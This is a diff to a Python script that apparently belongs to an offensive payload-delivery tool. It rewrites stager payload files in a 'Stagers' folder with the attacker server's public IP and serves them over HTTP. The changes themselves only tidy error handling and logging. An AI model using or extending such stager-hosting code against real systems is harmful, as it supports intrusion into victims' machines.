@@ -102,8 +102,6 @@ def update_client_file():
 
         search_string, replace_string = search_replace_pairs[filename]
 
-        print(f"[*] Updating file at: {file_path}")
-
         if not os.path.isfile(file_path):
             print(f"[!] Payload file not found: {file_path}")
             continue
@@ -111,41 +109,41 @@ def update_client_file():
         try:
             with open(file_path, 'r') as file:
                 content = file.read()
-            print(f"[*] Original content from {file_path}:\n{content[:200]}...")  # Print first 200 chars for inspection
-        except Exception as e:
-            print(f"[!] Error reading file {file_path}: {e}")
-            continue
+            if search_string not in content:
+                print(f"[!] Search string '{search_string}' not found in the file {file_path}.")
+                continue
 
-        if search_string not in content:
-            print(f"[!] Search string '{search_string}' not found in the file {file_path}.")
-            continue
-
-        updated_content = content.replace(search_string, replace_string)
-        print(f"[*] Updated content for {file_path}:\n{updated_content[:200]}...")  # Print first 200 chars for inspection
-
-        try:
+            updated_content = content.replace(search_string, replace_string)
             with open(file_path, 'w') as file:
                 file.write(updated_content)
+            print(f"[*] Updated {file_path} with server IP: {PUBLIC_HOST}")
         except Exception as e:
-            print(f"[!] Error writing to file {file_path}: {e}")
-            continue
-
-        print(f"[*] Updated {file_path} with server IP: {PUBLIC_HOST}")
+            print(f"[!] Error processing file {file_path}: {e}")
 
 def start_http_server():
     update_client_file()  # Update the client file before serving
     payload_path = os.path.join(os.path.dirname(__file__), 'Stagers', PAYLOAD_FILENAME)
-    print(f"[*] Serving files from: {os.path.dirname(payload_path)}")  # Debugging line
-    
     if not os.path.isfile(payload_path):
         print(f"[!] Payload file not found: {payload_path}")
         return
 
     os.chdir(os.path.dirname(payload_path))
     handler = http.server.SimpleHTTPRequestHandler
-    httpd = socketserver.TCPServer(("", HTTP_PORT), handler)
-    print(f"[*] Starting HTTP server on port {HTTP_PORT}")
-    httpd.serve_forever()
+
+    class CustomHTTPRequestHandler(handler):
+        def handle_one_request(self):
+            try:
+                super().handle_one_request()
+            except Exception as e:
+                logging.error(f"Request handling error: {e}")
+                self.send_error(400, "Bad request")
+
+    try:
+        httpd = socketserver.TCPServer(("", HTTP_PORT), CustomHTTPRequestHandler)
+        print(f"[*] Starting HTTP server on port {HTTP_PORT}")
+        httpd.serve_forever()
+    except Exception as e:
+        logging.error(f"HTTP server error: {e}")
 
 def show_menu():
     while True:
